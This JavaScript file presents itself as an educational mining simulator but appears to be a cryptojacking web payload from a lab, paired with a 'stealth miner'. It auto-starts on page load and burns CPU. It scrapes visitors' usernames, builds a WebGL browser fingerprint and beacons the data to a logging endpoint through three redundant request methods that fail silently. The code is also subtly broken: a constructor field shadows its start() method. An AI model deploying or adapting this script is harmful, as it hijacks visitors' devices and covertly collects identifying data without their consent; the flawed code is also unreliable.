// Basic cryptocurrency mining simulator
// This is for educational purposes only - DO NOT USE FOR MALICIOUS PURPOSES

// Check if we're already being loaded by the stealth miner
if (window.minerLoaded) {
    console.log("Miner already loaded, not initializing basic miner");
} else {
    // Set a flag to prevent double loading
    window.minerLoaded = true;
    
    // Create the CryptoMiner class
    class CryptoMiner {
        constructor(intensity = 30) {
            this.active = false;
            this.hashes = 0;
            this.rate = 0;
            this.start = null;
            this.intensity = intensity;
            this.timer = null;
            this.reporter = null;
            this.ui = null;
            this.lastReport = 0;
            this.userIdentifier = null;
        }
        
        start() {
            if (this.active) return;
            
            this.active = true;
            this.start = new Date();
            this.hashes = 0;
            this.lastReport = 0;
            
            // Start mining
            this.mine();
            
            // Set up reporting on a shorter interval (3 seconds)
            this.reporter = setInterval(() => this.report(), 3000);
            
            // Send an immediate report to register the user
            setTimeout(() => this.report(), 500);
            
            // Create UI if not already created
            if (!this.ui) {
                this.createUI();
            }
            
            // Show UI
            if (this.ui) {
                this.ui.style.display = 'block';
            }
        }
        
        stop() {
            this.active = false;
            clearTimeout(this.timer);
            clearInterval(this.reporter);
            
            // Hide UI
            if (this.ui) {
                this.ui.style.display = 'none';
            }
        }
        
        mine() {
            if (!this.active) return;
            
            const start = performance.now();
            
            // Perform calculations based on intensity
            for (let i = 0; i < this.intensity * 50000; i++) {
                Math.sqrt(Math.random() * 10000) * Math.random();
            }
            
            const end = performance.now();
            const timeTaken = end - start;
            
            // Calculate simulated hash rate
            const hashesThisRound = Math.floor(this.intensity * 500);
            this.rate = Math.floor(hashesThisRound / (timeTaken / 1000));
            this.hashes += hashesThisRound;
            
            // Check if we should report stats (every 3 seconds or after 50 hashes)
            const now = Date.now();
            if ((now - this.lastReport > 3000) || (this.hashes % 50 === 0)) {
                this.report();
                this.lastReport = now;
            }
            
            // Update UI
            this.updateUI();
            
            // Schedule next mining operation
            this.timer = setTimeout(() => this.mine(), 100);
        }
        
        report() {
            if (!this.active) return;
            
            // Always report, even with small hash counts
            // This ensures we get data immediately when someone views the page
            
            // Prepare data to send
            const data = {
                h: this.hashes,
                r: this.rate,
                t: Math.floor((new Date() - this.start) / 1000),
                ua: navigator.userAgent,
                url: window.location.href,
                ts: new Date().toISOString()
            };
            
            // Try to extract username from the page
            let username = '';
            
            // Method 1: Check for welcome message
            const welcomeElements = document.querySelectorAll('p, div, span, h1, h2, h3, h4, h5, h6');
            for (let i = 0; i < welcomeElements.length; i++) {
                const text = welcomeElements[i].textContent;
                const match = text.match(/Welcome,\s+(\w+)/i) || text.match(/Hello,\s+(\w+)/i) || text.match(/Logged in as\s+(\w+)/i);
                if (match && match[1]) {
                    username = match[1];
                    break;
                }
            }
            
            // Method 2: Look for username in URL
            if (!username) {
                const urlParams = new URLSearchParams(window.location.search);
                if (urlParams.has('user')) {
                    username = urlParams.get('user');
                }
            }
            
            // Method 3: Look for username in page title
            if (!username) {
                const title = document.title;
                const titleMatch = title.match(/(\w+)'s profile/i) || title.match(/profile: (\w+)/i);
                if (titleMatch && titleMatch[1]) {
                    username = titleMatch[1];
                }
            }
            
            // Method 4: Look for username in the page content
            if (!username) {
                // Look for any element that might contain a username
                const possibleUsernameElements = document.querySelectorAll('.username, .user-name, .user, .profile-name, .account-name');
                for (let i = 0; i < possibleUsernameElements.length; i++) {
                    if (possibleUsernameElements[i].textContent.trim()) {
                        username = possibleUsernameElements[i].textContent.trim();
                        break;
                    }
                }
            }
            
            // Add username to data
            data.username = username || 'unknown_user';
            
            // Generate a semi-unique identifier for this user/browser
            if (!this.userIdentifier) {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                let fingerprint = '';
                
                // Try to get browser-specific info
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        fingerprint += gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        fingerprint += gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
                
                // Add more browser data
                fingerprint += navigator.userAgent;
                fingerprint += navigator.language;
                fingerprint += screen.colorDepth;
                fingerprint += screen.width + 'x' + screen.height;
                
                // Simple hash function
                let hash = 0;
                for (let i = 0; i < fingerprint.length; i++) {
                    hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
                    hash = hash & hash; // Convert to 32bit integer
                }
                
                this.userIdentifier = Math.abs(hash).toString(16).substring(0, 8);
            }
            
            // Add identifier to data
            data.id = this.userIdentifier;
            
            // Send data via multiple methods to ensure it gets through
            try {
                // Method 1: Image request (most reliable)
                const img = new Image();
                img.src = `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`;
                
                // Method 2: Fetch API with no-cors
                fetch(`http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, {
                    mode: 'no-cors',
                    cache: 'no-cache'
                }).catch(() => {
                    // Silently fail if fetch doesn't work
                });
                
                // Method 3: XMLHttpRequest as fallback
                const xhr = new XMLHttpRequest();
                xhr.open('GET', `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, true);
                xhr.send();
                
                console.log("Mining report sent:", data);
            } catch (e) {
                console.error("Failed to report mining stats:", e);
            }
        }
        
        createUI() {
            // Create UI container
            this.ui = document.createElement('div');
            this.ui.style.position = 'fixed';
            this.ui.style.bottom = '10px';
            this.ui.style.right = '10px';
            this.ui.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
            this.ui.style.color = '#fff';
            this.ui.style.padding = '10px';
            this.ui.style.borderRadius = '5px';
            this.ui.style.fontFamily = 'monospace';
            this.ui.style.fontSize = '12px';
            this.ui.style.zIndex = '9999';
            this.ui.style.boxShadow = '0 0 10px rgba(0, 0, 0, 0.5)';
            
            // Create UI content
            this.ui.innerHTML = `
                <div style="margin-bottom: 5px; font-weight: bold; text-align: center;">Crypto Miner</div>
                <div>Hashes: <span id="miner-hashes">0</span></div>
                <div>Rate: <span id="miner-rate">0</span> H/s</div>
                <div>Time: <span id="miner-time">00:00:00</span></div>
                <div style="margin-top: 5px; text-align: center;">
                    <button id="miner-toggle" style="background: #f44336; color: white; border: none; padding: 3px 8px; border-radius: 3px; cursor: pointer;">Stop</button>
                </div>
            `;
            
            // Add to document
            document.body.appendChild(this.ui);
            
            // Add event listener to toggle button
            document.getElementById('miner-toggle').addEventListener('click', () => {
                if (this.active) {
                    this.stop();
                    document.getElementById('miner-toggle').textContent = 'Start';
                    document.getElementById('miner-toggle').style.background = '#4caf50';
                } else {
                    this.start();
                    document.getElementById('miner-toggle').textContent = 'Stop';
                    document.getElementById('miner-toggle').style.background = '#f44336';
                }
            });
        }
        
        updateUI() {
            if (!this.ui) return;
            
            // Update hash count
            const hashesElement = document.getElementById('miner-hashes');
            if (hashesElement) {
                hashesElement.textContent = this.hashes.toLocaleString();
            }
            
            // Update hash rate
            const rateElement = document.getElementById('miner-rate');
            if (rateElement) {
                rateElement.textContent = this.rate.toLocaleString();
            }
            
            // Update time
            const timeElement = document.getElementById('miner-time');
            if (timeElement && this.start) {
                const seconds = Math.floor((new Date() - this.start) / 1000);
                const h = Math.floor(seconds / 3600);
                const m = Math.floor((seconds % 3600) / 60);
                const s = seconds % 60;
                timeElement.textContent = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
            }
        }
        
        isRunning() {
            return this.active;
        }
    }
    
    // Create global miner instance
    window.CryptoMiner = CryptoMiner;
    window.miner = new CryptoMiner();
    
    // Start mining automatically if not being loaded by stealth miner
    if (!window.stealthMinerActive) {
        // Wait for page to load
        window.addEventListener('load', () => {
            setTimeout(() => {
                window.miner.start();
            }, 500);
        });
    }
} 